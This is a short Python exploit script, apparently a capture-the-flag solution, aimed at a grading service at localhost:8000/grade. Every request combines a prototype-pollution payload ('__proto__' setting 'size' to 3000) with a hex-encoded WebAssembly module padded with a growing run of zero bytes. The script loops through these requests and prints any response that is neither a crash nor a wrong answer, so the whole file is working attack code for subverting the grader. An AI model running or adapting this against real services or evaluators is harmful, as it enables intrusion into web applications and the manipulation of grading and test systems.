import requests 
data = "61736d0100000001070160027f7f017f020f0103656e76066d656d6f7279020000030201000718020b6c6576656e73687465696e0000066d656d6f727902000a0601040041000b0038046e616d65010e01000b6c6576656e73687465696e020b010002000270300102703104050100027430060d01000a656e762e6d656d6f727900dc04"
for i in range(0,1000):
    if i%100 == 0:
        print(i)
    newdata = "00"*i + data 
    endpoint = "http://localhost:8000/grade"
    response = requests.post(endpoint,json = 
        {
        "__proto__":{
            "size":3000
        },
        "input":newdata
    })
    if "Process crashed or didn't return an integer" in response.text or "Wrong Answer" in response.text:
        continue 
    print(response.text)